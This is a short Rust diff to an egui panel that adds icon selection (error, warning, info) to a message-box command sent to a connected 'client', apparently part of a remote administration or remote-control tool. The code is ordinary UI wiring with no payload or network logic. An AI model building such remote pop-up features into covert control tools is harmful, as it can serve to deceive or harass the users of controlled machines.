@@ -1,9 +1,23 @@
 use egui::{Align, Layout, TextEdit, Ui, vec2};
-use shared::commands::{Command, MessageBoxArgs};
+use shared::commands::{Command, MessageBoxArgs, MessageBoxIcon};
 
 use crate::{manager::types::UiManagerCommand, ui::client::ClientView};
 
 pub fn render(view: &mut ClientView, ui: &mut Ui) {
+    ui.horizontal(|ui| {
+        ui.radio_value(
+            &mut view.state.msgbox.icon,
+            MessageBoxIcon::Error,
+            "❌  Error",
+        );
+        ui.radio_value(
+            &mut view.state.msgbox.icon,
+            MessageBoxIcon::Warning,
+            "⚠  Warning",
+        );
+        ui.radio_value(&mut view.state.msgbox.icon, MessageBoxIcon::Info, "🛈  Info");
+    });
+
     ui.add(TextEdit::singleline(&mut view.state.msgbox.title).desired_width(ui.available_width()));
     ui.add_sized(
         vec2(
@@ -18,6 +32,7 @@ pub fn render(view: &mut ClientView, ui: &mut Ui) {
             let _ = view.sender.send(UiManagerCommand::SendCommand(
                 view.mutex.clone(),
                 Command::MessageBox(MessageBoxArgs {
+                    icon: view.state.msgbox.icon.clone(),
                     title: view.state.msgbox.title.clone(),
                     text: view.state.msgbox.text.clone(),
                 }),
